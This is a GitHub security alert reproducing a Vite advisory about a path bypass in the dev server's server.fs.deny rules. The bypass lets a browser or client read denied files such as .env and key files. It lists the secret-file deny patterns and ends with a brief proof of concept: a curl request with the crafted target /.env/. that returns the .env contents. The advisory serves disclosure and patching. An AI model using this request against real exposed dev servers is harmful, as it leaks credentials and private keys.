### GitHub Vulnerability Alerts

#### [GHSA-859w-5945-r5v3](https://redirect.github.com/vitejs/vite/security/advisories/GHSA-859w-5945-r5v3)

### Summary
The contents of files in [the project `root`](https://vite.dev/config/shared-options.html#root) that are denied by a file matching pattern can be returned to the browser.

### Impact

Only apps explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.
Only files that are under [project `root`](https://vite.dev/config/shared-options.html#root) and are denied by a file matching pattern can be bypassed.

- Examples of file matching patterns: `.env`, `.env.*`, `*.{crt,pem}`, `**/.env`
- Examples of other patterns: `**/.git/**`, `.git/**`, `.git/**/*`

### Details
[`server.fs.deny`](https://vite.dev/config/server-options.html#server-fs-deny) can contain patterns matching against files (by default it includes `.env`, `.env.*`, `*.{crt,pem}` as such patterns).
These patterns were able to bypass for files under `root` by using a combination of slash and dot (`/.`).

### PoC
```
npm create vite@latest
cd vite-project/
cat "secret" > .env
npm install
npm run dev
curl --request-target /.env/. http://localhost:5173
```
